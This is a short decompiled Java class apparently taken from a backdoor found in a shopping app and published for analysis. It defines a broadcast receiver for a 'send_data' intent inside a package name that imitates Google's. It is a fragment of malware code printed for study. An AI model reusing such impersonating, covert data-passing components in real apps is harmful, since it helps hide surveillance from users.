package com.google.android.sd.biz_dynamic_dex.ud_notification_listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.SystemClock;
import android.text.TextUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

public final class a {
  String a;
  
  BroadcastReceiver b = new BroadcastReceiver(this) {
      public final void onReceive(Context param1Context, Intent param1Intent) {
        TextUtils.equals("send_data", param1Intent.getAction());
        param1Context.unregisterReceiver(this);
        String str = param1Intent.getStringExtra("data");
        a.a(this.a, param1Context, str);
      }
    };
  
  private final AtomicBoolean c = new AtomicBoolean(false);
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\ab8ed4c3482c42a1b8baef558ee79deb-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\ud_notification_listener\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */